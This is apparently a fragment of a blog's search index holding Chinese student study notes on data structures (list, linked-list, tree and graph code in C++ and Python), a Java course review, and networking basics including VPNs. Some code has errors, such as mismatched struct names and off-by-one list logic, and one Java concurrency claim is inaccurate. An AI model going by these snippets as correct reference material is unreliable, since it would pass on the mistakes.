class="number">1</span>]=L.elem[j];   <span class="comment">//从最后一个元素开始后移，直到第i个元素后移</span></span><br><span class="line">	L.elem[i<span class="number">-1</span>]=e;              <span class="comment">//将新元素e放入第i个位置</span></span><br><span class="line">	L.length++;		     	<span class="comment">//表长增1</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">addnum</span>(<span class="params">self,value,index</span>):</span><br><span class="line">    <span class="keyword">if</span> index&gt;self.<span class="built_in">max</span>-<span class="number">1</span> <span class="keyword">or</span> index&lt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    i=self.num</span><br><span class="line">    <span class="keyword">while</span> i&gt;=index:</span><br><span class="line">        self.data[i]=self.data[i-<span class="number">1</span>]</span><br><span class="line">        i-=<span class="number">1</span></span><br><span class="line">    self.data[index-<span class="number">1</span>]=value</span><br></pre></td></tr></table></figure>
<p>而在顺序表中删除第<em>i</em>个元素，需要把该元素暂存到变量<em>e</em>，然后从<em>i</em>+1个元素开始前移，…，直到把第<em>n</em>个元素也前移一位，即可完成删除操作。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListDelete_Sq</span><span class="params">(SqList &amp;L,<span class="type">int</span> i,<span class="type">int</span> &amp;e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>((i&lt;<span class="number">1</span>)||(i&gt;L.length)) <span class="keyword">return</span> <span class="literal">false</span>;	 <span class="comment">//i值不合法</span></span><br><span class="line">	e=L.elem[i<span class="number">-1</span>];   <span class="comment">//将欲删除的元素保留在e中</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j=i;j&lt;=L.length<span class="number">-1</span>;j++)</span><br><span class="line">		L.elem[j<span class="number">-1</span>]=L.elem[j]; <span class="comment">//被删除元素之后的元素前移</span></span><br><span class="line">	L.length--; <span class="comment">//表长减1</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">deletenum</span>(<span class="params">self,index</span>):</span><br><span class="line">    <span class="keyword">if</span> index&gt;self.<span class="built_in">max</span> <span class="keyword">or</span> index&lt;<span class="number">1</span>:<span class="comment">#判断是否合法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    self.data[index-<span class="number">1</span>]=<span class="literal">None</span> <span class="comment">#删除元素</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index,self.<span class="built_in">max</span>):<span class="comment"># 依次移动</span></span><br><span class="line">        self.data[i-<span class="number">1</span>]=self.data[i]</span><br><span class="line">    self.data[self.num]=<span class="literal">None</span> <span class="comment">#最后一个数字要变为None</span></span><br></pre></td></tr></table></figure>
<h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><p>链表呢就是有指针的表了，它像链条一样链接起各个元素，特点是插入和删除数据十分方便，但是寻找和读取数据能力欠佳。</p>
<h3 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h3><p>单链表的图示图下：</p>
<p><img src="https://s2.loli.net/2022/11/09/68OkI9CQHpL1B4t.png" alt="image2.png"></p>
<p>每一个单独结构可以分成两部分，数据部分和指针部分（也有表达为数据域和指针域的），</p>
<p>首先定义结构以及初始化，初始化的步骤呢就是先无中生有一个头节点，将他的指针域指向空即可。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Lnode</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> data; <span class="comment">//结点的数据域</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">LNode</span> *next; <span class="comment">//结点的指针域</span></span><br><span class="line">&#125;Lnode, *Linklist<span class="comment">//LinkList为指向结构体LNode的指针类型</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InitList_L</span><span class="params">(LinkList &amp;L)</span><span class="comment">//构造一个空的单链表L</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L=<span class="keyword">new</span> LNode;     <span class="comment">//生成新结点作为头结点，用头指针L指向头结点</span></span><br><span class="line">	<span class="keyword">if</span>(!L)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">//生成结点失败</span></span><br><span class="line">	L-&gt;next=<span class="literal">NULL</span>;   <span class="comment">//头结点的指针域置空</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="创建单链表"><a href="#创建单链表" class="headerlink" title="创建单链表"></a>创建单链表</h4><p>修改指针的顺序原则：先修改没有指针标记的那一端。</p>
<h5 id="头（前）插法"><a href="#头（前）插法" class="headerlink" title="头（前）插法"></a>头（前）插法</h5><p>这个呢代表着新的结构体是从头节点后面插入的，且每次插入都是从头节点插入，所以依次插入之后呢，结果会和插入的顺序相反，比如输入的序列是：1，2，3，4，那么实际生成的单链表是4-&gt;3-&gt;2-&gt;1。这里注意头节点是没有数据的噢~</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateList_H</span><span class="params">(LinkList &amp;L)</span><span class="comment">//前插法创建单链表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	LinkList s; <span class="comment">//定义一个指针变量</span></span><br><span class="line">	L=<span class="keyword">new</span> LNode;<span class="comment">//新建头节点</span></span><br><span class="line">	L-&gt;next=<span class="literal">NULL</span>; <span class="comment">//先建立一个带头结点的空链表</span></span><br><span class="line">	cin&gt;&gt;n;<span class="comment">//n表示元素数量</span></span><br><span class="line">	<span class="keyword">while</span>(n--)</span><br><span class="line">    &#123;</span><br><span class="line">		s=<span class="keyword">new</span> LNode; <span class="comment">//生成新结点s</span></span><br><span class="line">		cin&gt;&gt;s-&gt;data; <span class="comment">//输入元素值赋给新结点的数据域</span></span><br><span class="line">		s-&gt;next=L-&gt;next;<span class="comment">//先修改没有标记的一端（指没有头指针标记）</span></span><br><span class="line">		L-&gt;next=s; <span class="comment">//将新结点s插入到头结点之后</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="尾插法"><a href="#尾插法" class="headerlink" title="尾插法"></a>尾插法</h5><p>尾插法就是指每次插入都从最后一个结构后面插入，插入完毕后修改尾指针指向。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateList_R</span><span class="params">(LinkList &amp;L)</span><span class="comment">//尾插法创建单链表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	LinkList s, r;</span><br><span class="line">	L=<span class="keyword">new</span> LNode;</span><br><span class="line">	L-&gt;next=<span class="literal">NULL</span>; <span class="comment">//先建立一个带头结点的空链表</span></span><br><span class="line">	r=L; <span class="comment">//尾指针r指向头结点</span></span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">while</span>(n--)</span><br><span class="line">    &#123;</span><br><span class="line">		s=<span class="keyword">new</span> LNode;<span class="comment">//生成新结点</span></span><br><span class="line">		cin&gt;&gt;s-&gt;data; <span class="comment">//输入元素值赋给新结点的数据域</span></span><br><span class="line">		s-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		r-&gt;next=s;<span class="comment">//将新结点s插入尾结点*r之后</span></span><br><span class="line">		r=s;<span class="comment">//r指向新的尾结点s</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="取值，查找"><a href="#取值，查找" class="headerlink" title="取值，查找"></a>取值，查找</h4><p>单链表的取值不可以像顺序表一样直接找到任意一个元素，它只能从第一个节点开始往后依次找，一直找到第n个节点。而查找的话，可以定义一个p指针指向第一个元素节点并比较节点的数据域是否等于value。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GetElem_L</span><span class="params">(LinkList L,<span class="type">int</span> i,<span class="type">int</span> &amp;e)</span><span class="comment">//单链表的取值</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//在带头结点的单链表L中查找第i个元素</span></span><br><span class="line">	<span class="comment">//用e记录L中第i个数据元素的值</span></span><br><span class="line">	<span class="type">int</span> j;</span><br><span class="line">	LinkList p;</span><br><span class="line">	p=L-&gt;next;<span class="comment">//p指向第一个结点，</span></span><br><span class="line">	j=<span class="number">1</span>; <span class="comment">//j为计数器</span></span><br><span class="line">	<span class="keyword">while</span>(j&lt;i&amp;&amp;p) <span class="comment">//顺链域向后扫描，直到p指向第i个元素或p为空</span></span><br><span class="line">    &#123;</span><br><span class="line">		p=p-&gt;next; <span class="comment">//p指向下一个结点</span></span><br><span class="line">		j++; <span class="comment">//计数器j相应加1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!p||j&gt;i)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//i值不合法i＞n或i&lt;=0</span></span><br><span class="line">	e=p-&gt;data; <span class="comment">//取第i个结点的数据域</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">LocateElem_L</span><span class="params">(LinkList L, <span class="type">int</span> e)</span> <span class="comment">//按值查找</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LinkList p;	<span class="comment">//在带头结点的单链表L中查找值为e的元素</span></span><br><span class="line">	p=L-&gt;next;</span><br><span class="line">	<span class="keyword">while</span>(p&amp;&amp;p-&gt;data!=e)<span class="comment">//顺链域向后扫描，直到p为空或p所指结点的数据域等于e</span></span><br><span class="line">		p=p-&gt;next; <span class="comment">//p指向下一个结点</span></span><br><span class="line">	<span class="keyword">if</span>(!p)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//查找失败p为NULL</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="树"><a href="#树" class="headerlink" title="树"></a>树</h2><h3 id="二叉树，树，森林间的转换"><a href="#二叉树，树，森林间的转换" class="headerlink" title="二叉树，树，森林间的转换"></a>二叉树，树，森林间的转换</h3><h4 id="树转二叉树"><a href="#树转二叉树" class="headerlink" title="树转二叉树"></a>树转二叉树</h4><ol>
<li>树所有相邻兄弟节点之间加虚线</li>
<li>树中每个节点只保留与长子（左孩子）的连线，删除与其他孩子的连线</li>
<li>以跟节点为轴心，整棵树顺时针转45°。</li>
</ol>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/1b4cd5a818385c47.png" alt=""></p>
<h4 id="森林转二叉树"><a href="#森林转二叉树" class="headerlink" title="森林转二叉树"></a>森林转二叉树</h4><ol>
<li>每棵树转二叉树</li>
<li>第一棵二叉树不动，第二棵树开始，依次把后一棵二叉树的根节点作为前一棵二叉树根节点的右孩子节点，直到所有二叉树连接在一起</li>
</ol>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/56dc9fc36f73271b.png" alt=""></p>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/d81d04d2f23d3cae.png" alt=""></p>
<h4 id="二叉树还原成树"><a href="#二叉树还原成树" class="headerlink" title="二叉树还原成树"></a>二叉树还原成树</h4><ol>
<li>若某结点是其双亲的左孩子，则把该结点的右孩子、右孩子的右孩子等都与该结点的双亲结点用连线连起来</li>
<li>删除原二叉树中所有双亲结点与右孩子结点之间的连线</li>
<li>整理</li>
</ol>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/a44f2b8ca00935fb.png" alt=""></p>
<h4 id="二叉树还原成森林"><a href="#二叉树还原成森林" class="headerlink" title="二叉树还原成森林"></a>二叉树还原成森林</h4><ol>
<li>切开根节点右链上所有“双亲-右孩子”的关系，分为若干二叉树</li>
<li>将这些二叉树还原为树</li>
</ol>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/8b51253149316860.png" alt=""></p>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/3753eb66fcb5d9b4.png" alt=""></p>
<h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><p>图分为节点结构和图结构，节点结构包括一条边的起点，终点和边的权重，图结构包括整个图的边数，节点数以及节点的集合。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">	<span class="type">char</span> a,b;<span class="comment">//起点和终点</span></span><br><span class="line">	<span class="type">int</span> w;<span class="comment">//权</span></span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">	<span class="type">int</span> len,n;<span class="comment">//长度和顶点个数</span></span><br><span class="line">	Node *list;<span class="comment">//节点集合</span></span><br><span class="line">&#125;Graph;</span><br></pre></td></tr></table></figure>
<h3 id="初始化和构建图"><a href="#初始化和构建图" class="headerlink" title="初始化和构建图"></a>初始化和构建图</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">initList</span><span class="params">(Graph &amp;G)</span></span>&#123;</span><br><span class="line">	G.len=<span class="number">0</span>;</span><br><span class="line">	G.list=<span class="keyword">new</span> Node[MAX];</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetList</span><span class="params">(Graph &amp;G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cin&gt;&gt;G.len&gt;&gt;G.n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;G.n;i++)</span><br><span class="line">		cin&gt;&gt;node[i];<span class="comment">//这一步是输入节点名称，需全局定义一个字符数组。</span></span><br><span class="line">	G.list[<span class="number">0</span>].w=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;G.len;i++)</span><br><span class="line">		cin&gt;&gt;G.list[i].a&gt;&gt;G.list[i].b&gt;&gt;G.list[i].w;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>到这里一个完整的图就构建完毕了，关于图的算法有挺多，仍在摸索ing……</p>
<p>参考文章：文中部分图片出自：<a href="https://blog.csdn.net/kindoms214/article/details/85699598">https://blog.csdn.net/kindoms214/article/details/85699598</a></p>
<p>标记：持续施工中……</p>
]]></content>
      <categories>
        <category>大二课程</category>
      </categories>
      <tags>
        <tag>复习</tag>
        <tag>总结</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>大二上java程序设计期末复习</title>
    <url>/2022/11/29/%E5%A4%A7%E4%BA%8C%E4%B8%8AJava%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<p> 整理了一下ppt的内容，java程序设计课程的课件。</p>
<h1 id="软件开发-Software-Development"><a href="#软件开发-Software-Development" class="headerlink" title="软件开发(Software Development)"></a>软件开发(Software Development)</h1><h2 id="Agile-Methodologies（敏捷方法）"><a href="#Agile-Methodologies（敏捷方法）" class="headerlink" title="Agile Methodologies（敏捷方法）"></a>Agile Methodologies（敏捷方法）</h2><p>这是一种快速部署应用程序的理念，优点包括：</p>
<ul>
<li><p>persistent software delivery 持续提交软件</p>
</li>
<li><p>increased stakeholder satisfaction 增加利益方的满意度</p>
</li>
<li><p>inspect and adapt 检查调整</p>
</li>
<li><p>welcome to changes at any stage 支持任意阶段修改</p>
</li>
<li><p>design is important 设计至关重要</p>
</li>
<li><p>daily interaction 日常互动</p>
</li>
</ul>
<h2 id="版本控制（version-control）"><a href="#版本控制（version-control）" class="headerlink" title="版本控制（version control）"></a>版本控制（version control）</h2><p>就是说需要一个git来控制一下版本，对多人合作很方便。而关于这个git的用法可以看看<a href="https://zthlly.github.io/2022/09/13/git的基本用法/">这篇博客</a> 。</p>
<h2 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h2><p>这里多说两句这个JVM，JVM（Java Virtucal Machine）是一个类似虚拟机的玩意，它运行在操作系统之下，通过与操作系统交互达到与硬件交互的目的。知道这个之后我们看看java文件怎么运行，首先写完一个.java文件之后通过编译器编译得到一个.class文件，然后通过类加载器把这个.class丢到JVM里面。这里再多提两句嘴，JVM内主要的五大块：方法区，堆是线程共享区域，有线程安全问题，栈和本地方法栈和计数器是独享区域，不存在线程安全问题。</p>
<h1 id="Java语言基础"><a href="#Java语言基础" class="headerlink" title="Java语言基础"></a>Java语言基础</h1><h2 id="语言基础语法"><a href="#语言基础语法" class="headerlink" title="语言基础语法"></a>语言基础语法</h2><p>这个去<a href="https://zthlly.github.io/2022/07/02/Java入门基础/" title="si1v3r的狗窝捏">这里</a>看。</p>
<h2 id="UML图"><a href="#UML图" class="headerlink" title="UML图"></a>UML图</h2><p>呃就是一个类的图形化表示，举个例子吧~</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/11/29/b41b30ebbe997a4f.png" alt=""></p>
<h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><ul>
<li>Mistakes like omitting the base case or writing the recursion step incorrectly can cause infinite recursion. <strong>小心无限递归爆栈</strong></li>
<li>Recursive programs may result in exponential method calls <strong>递归可能导致指数级别调用</strong></li>
<li>Each recursive method can be re-written using loops<strong>所有递归可重写为循环</strong></li>
<li>Use recursive methods only if the problem is naturally recursive (i.e., to improve understanding) or there are performance benefits, or you need to impress in a job interview<strong>在必要的时候再用递归</strong></li>
</ul>
<h2 id="Concurrency-in-Java-（并发）"><a href="#Concurrency-in-Java-（并发）" class="headerlink" title="Concurrency in Java （并发）"></a>Concurrency in Java （并发）</h2><p>Complex applications may use multithreading to speed up performance or user experience  <strong>复杂的程序会使用多线程来加速性能或用户体验</strong> </p>
<h3 id="Caveats-of-multithreading（多线程注意事项）"><a href="#Caveats-of-multithreading（多线程注意事项）" class="headerlink" title="Caveats of multithreading（多线程注意事项）"></a>Caveats of multithreading（多线程注意事项）</h3><ul>
<li>Calling methods from multiple threads may have undesired and unexpected side effects (things may not happen in the expected order)   <strong>可能有副作用</strong></li>
<li>Only primitive variables that are declared <strong>final</strong> can be shared across threads  <strong>只有声明final的变量可以跨线程共享</strong></li>
<li>Using keyword <strong>synchronized</strong> will “lock” the method execution and force other threads to wait until the execution completes <strong>使用关键字同步将“锁定”方法的执行，并强制其他线程等待，直到执行完成</strong></li>
<li>Thread can be in different states. After termination, thread can’t be started again (however, you can create a new thread). <strong>线程终止后不能再次启动，但是可以创建一个新的线程</strong></li>
</ul>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/06/084e6b23e9a89d42.png" alt=""></p>
<h2 id="Exception-handling-（异常处理）"><a href="#Exception-handling-（异常处理）" class="headerlink" title="Exception handling  （异常处理）"></a>Exception handling  （异常处理）</h2><ul>
<li>An <em>exception</em> is an event, which occurs during the execution of a program, that disrupts the normal flow of the program’s instructions</li>
<li><strong>Exception handler</strong> is a block of code that can handle the exception</li>
<li>Java allows to separate exception handling code from the normal code to improve the readability</li>
<li>Exceptions are propagated across the call stack until exception handler is found so developer can choose at which level exceptions should be handled</li>
<li>Each organisation will have its own house style on how to write and handle exceptions</li>
</ul>
<p>主要层次结构如下：</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/06/aab3b03140ebf50d.png" alt=""></p>
]]></content>
      <categories>
        <category>大二课程</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>校内课程</tag>
        <tag>复习</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络学习</title>
    <url>/2023/09/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p> 关于网络的一些科普和笔记~</p>
<h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><p>IP地址是统一的地址格式，表示互联网上每一台主机和网络的<strong>逻辑地址</strong>，IP地址由纯数字组成，分为IPv4和IPv6两种，前者是由四段十进制的数字，从0.0.0.0到255.255.255.255 。后者则是八组16进制表示</p>
<p>在Linux中指向ifconfig指令的时候得到的参数如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.234.130  netmask 255.255.255.0  broadcast 192.168.234.255</span><br><span class="line">        inet6 fe80::c48b:6823:dd50:f808  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:71:88:4b  txqueuelen 1000  (以太网)</span><br><span class="line">        RX packets 1412  bytes 1463239 (1.4 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 439  bytes 62066 (62.0 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ens33</code>是网络接口名称；</li>
<li><code>flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;</code>表示该网络接口当前处于启用、广播、运行和多播状态；</li>
<li><code>inet 192.168.234.130</code>表示该网络接口的IPv4地址为192.168.234.130；</li>
<li><code>netmask 255.255.255.0</code>表示该网络接口的子网掩码为255.255.255.0；</li>
<li><code>broadcast 192.168.234.255</code>表示该网络接口的广播地址为192.168.234.255；</li>
<li><code>ether 00:0c:29:71:88:4b</code>表示该网络接口的MAC地址为00:0c:29:71:88:4b；</li>
<li><code>mtu 1500</code>表示该网络接口的最大传输单元为1500字节；</li>
<li><code>RX packets 1412 bytes 1463239</code>表示该网络接口自启用以来，收到了1412个数据包，共1463239字节；</li>
<li><code>RX errors 0 dropped 0 overruns 0 frame 0</code>表示该网络接口自启用以来，没有出现接收错误、丢包、溢出或帧错误；</li>
<li><code>TX packets 439 bytes 62066</code>表示该网络接口自启用以来，发送了439个数据包，共62066字节；</li>
<li><code>TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0</code>表示该网络接口自启用以来，没有出现发送错误、丢包、溢出、冲突或载波错误。</li>
<li>lo那里是本地回环接口</li>
</ul>
<h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>IP由于是纯数字组成，不方便记忆，所以产生域名</p>
<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>域名系统，作为域名和IP地址相互映射的分布式数据库，能使人更方便访问互联网，主要作用是将域名翻译为可被计算机识别的IP地址，这个过程就是域名解析</p>
<h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><p>计算机网络设备，将数据通过打包一个个网络传送至目的地，这个过程称为<strong>路由</strong>。路由器连接两个以上个别网络的设备，在网络之间起到网关的作用。路由器通过读取每个数据包中的IP地址来决定如何传送</p>
<h2 id="127-0-0-1"><a href="#127-0-0-1" class="headerlink" title="127.0.0.1"></a>127.0.0.1</h2><p>127开头的ip都是回环地址，说明发送给127的ip数据会发送回自己，传不出去的，外部设备也不能访问到本机</p>
<h2 id="0-0-0-0"><a href="#0-0-0-0" class="headerlink" title="0.0.0.0"></a>0.0.0.0</h2><p>ping不通的，表示本机所有Ipv4地址，监听0.0.0.0的端口就是监听本机所有ip的端口</p>
<h2 id="本机ip"><a href="#本机ip" class="headerlink" title="本机ip"></a>本机ip</h2><p>本机IP通常仅指在同一个局域网内，能同时被外部设备访问和本机访问的那些IP地址（可能不止一个）。像127.0.0.1这种一般是不被当作本机IP的。本机IP是与具体的网络接口绑定的，比如以太网卡、无线网卡或者PPP/PPPoE拨号网络的虚拟网卡，想要正常工作都要绑定一个地址，否则其他设备就不知道如何访问它。</p>
<h2 id="访问互联网上服务器过程"><a href="#访问互联网上服务器过程" class="headerlink" title="访问互联网上服务器过程"></a>访问互联网上服务器过程</h2><ol>
<li>客户端向DNS服务器查询目标服务器的IP地址 客户端通过DNS（Domain Name System）服务器查询目标服务器的IP地址。DNS服务器根据域名解析出对应的IP地址，并将结果返回给客户端。</li>
<li>客户端与目标服务器建立TCP连接 客户端使用目标服务器的IP地址和端口号建立TCP连接。TCP是一种可靠的协议，它可以确保数据传输的准确性和完整性。</li>
<li>客户端发送HTTP请求 ，请求中包含了客户端想要获取的资源信息，如请求的URL、请求方法、请求头等。</li>
<li>服务器响应HTTP请求 服务器接收到客户端的请求后，根据请求内容生成HTTP响应，响应中包含了请求的资源信息，如响应状态码、响应头、响应体等。</li>
<li>客户端接收服务器响应 客户端接收到服务器的响应后，解析响应内容，获取所需的资源信息。如果需要，客户端可以对响应进行处理，如渲染网页、保存文件等。</li>
<li>断开TCP连接 当数据传输完成后，客户端与服务器之间的TCP连接被断开。客户端和服务器都可以继续与其他客户端或服务器建立连接，进行后续的数据传输。</li>
</ol>
<h2 id="封锁原理"><a href="#封锁原理" class="headerlink" title="封锁原理"></a>封锁原理</h2><p>封锁的实现方式包括DNS污染、IP封锁、HTTP代理屏蔽等。具体来说，在DNS污染中，中国政府会通过修改域名解析记录，使得用户无法正确访问被封锁的网站；在IP封锁中，政府会直接屏蔽被封锁网站的IP地址，从而使得用户无法通过访问IP地址来访问网站；在HTTP代理屏蔽中，政府会监控网络流量，对用户的访问请求进行过滤，从而防止用户访问被封锁的网站。</p>
<h2 id="vpn作用及绕过方法"><a href="#vpn作用及绕过方法" class="headerlink" title="vpn作用及绕过方法"></a>vpn作用及绕过方法</h2><p>如果是因为IP封锁导致无法访问某个网站，使用VPN（虚拟私人网络）可以绕过封锁。因为VPN会建立一条加密的隧道，将用户的数据流量传输到VPN服务器，再由VPN服务器发送给目标网站。在这个过程中，VPN服务器的IP地址代替了用户本身的IP地址，从而可以避开被封锁的IP地址。</p>
<p>因为VPN服务器的IP地址通常不会被屏蔽，所以使用VPN可以有效地绕过IP封锁。当然，也有可能会出现VPN被封锁的情况，但是一些VPN服务提供商会尝试更新其服务器的IP地址以避免被封锁。不过需要注意的是，使用VPN绕过封锁可能会违反当地法律法规，所以需要谨慎使用。</p>
<p>使用VPN时，用户的本机IP地址将被替换为VPN服务器的IP地址。当用户访问被封锁的网站时，请求将首先被发送到VPN服务器，然后由VPN服务器代表用户发送请求。因此，对于被封锁的网站或服务器来说，它们只能看到VPN服务器的IP地址，而无法知道用户的真实IP地址。这就是VPN绕过IP封锁的原理之一。</p>
<h2 id="网卡和网关"><a href="#网卡和网关" class="headerlink" title="网卡和网关"></a>网卡和网关</h2><p>网卡是计算机中的<strong>硬件设备</strong>，通常是一块扩展卡或集成在主板上的芯片，用于连接计算机到网络。网卡负责处理数据包的发送和接收，以及将数据包从计算机传输到网络媒体（如以太网、Wi-Fi等）或从网络媒体接收到计算机。每个计算机都需要至少一个网卡来进行网络通信，而有些计算机可能有多个网卡，以支持不同的网络连接。</p>
<p>网关是数据包从一个网络传输到另一个网络的出入口。它可以是硬件设备，比如路由器；也可以是运行特定协议的计算机，负责将数据包从一个网络传输到另一个网络。</p>
<h2 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h2><p>数据包发送和接受的过程：</p>
<ol>
<li>程序生成数据包，传递给操作系统</li>
<li>操作系统发送数据包到网卡</li>
<li>网卡发送数据包到路由器</li>
<li>路由器将数据包发送到外网服务器，这里路由器起到了网关的作用</li>
<li>外网服务器接收数据包，处理请求，返回响应数据包</li>
<li>响应数据包通过路由器传回计算机，再通过网卡传递给应用程序</li>
</ol>
<h2 id="NAT-网络地址转换"><a href="#NAT-网络地址转换" class="headerlink" title="NAT 网络地址转换"></a>NAT 网络地址转换</h2><p>这是一个可以改变设备ip的技术，通常路由器会执行这个技术，这样路由器下的所有设备的ip都会改变，变成一个公共IP，这样所有该路由器下的设备都会共享这个公共IP。这样做最直观的结果就是，如果有用户想从外网访问私人设备，他是访问不了的，因为这个用户只能看到一个路由器的公共IP，甚至连这个公共IP下有多少个私人设备都不知道，更别说访问私人设备了。</p>
]]></content>
      <categories>
        <category>大三课程</category>
        <category>网络</category>
      </categories>
      <tags>
        <tag>校内课程</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>基础算法02</title>
    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9502/</url>
